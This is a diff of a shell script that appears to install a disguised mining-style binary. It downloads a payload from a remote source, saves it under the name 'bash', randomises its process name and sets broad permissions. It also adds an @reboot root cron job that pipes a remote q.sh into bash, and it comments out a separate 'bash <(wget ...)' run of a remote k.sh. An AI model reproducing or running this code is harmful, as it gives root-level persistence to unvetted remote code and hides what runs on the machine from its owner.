@@ -20,7 +20,7 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 [ -n "$addr" ] || addr="NULL"
 
 
-bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
+###bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
 idlePid="$!"
 
 
@@ -35,7 +35,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null
 
 rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q213"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q221"
 chmod -R 777 "${work}"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 [ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
